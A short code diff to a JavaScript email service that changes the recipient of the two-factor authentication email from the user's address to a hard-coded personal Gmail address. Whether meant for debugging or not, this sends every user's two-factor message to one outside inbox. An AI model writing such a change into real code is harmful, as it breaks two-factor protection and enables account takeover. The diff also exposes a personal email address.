@@ -21,7 +21,7 @@ const emailService = {
 
       const mailOptions = {
         from: process.env.AUTH_EMAIL,
-        to: email,
+        to: "chrispetrou17@gmail.com",
         subject: "Two-Factor Authentication Required",
         html: html,
       };
